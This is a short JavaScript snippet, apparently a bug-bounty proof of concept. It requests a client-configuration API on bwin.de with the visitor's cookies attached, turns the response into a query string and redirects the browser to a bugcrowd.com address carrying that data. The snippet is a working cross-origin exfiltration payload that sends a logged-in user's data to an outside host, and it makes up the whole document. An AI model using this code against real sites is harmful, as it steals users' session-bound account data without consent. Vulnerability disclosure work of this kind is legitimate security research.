fetch('https://www.bwin.de/de/api/clientconfig', { credentials: 'include' })
  .then(res => res.json())
  .then(data => {
    const queryString = new URLSearchParams(data).toString();
    window.location = `//bugcrowd.com/404.poc?data=${queryString}`;
  });
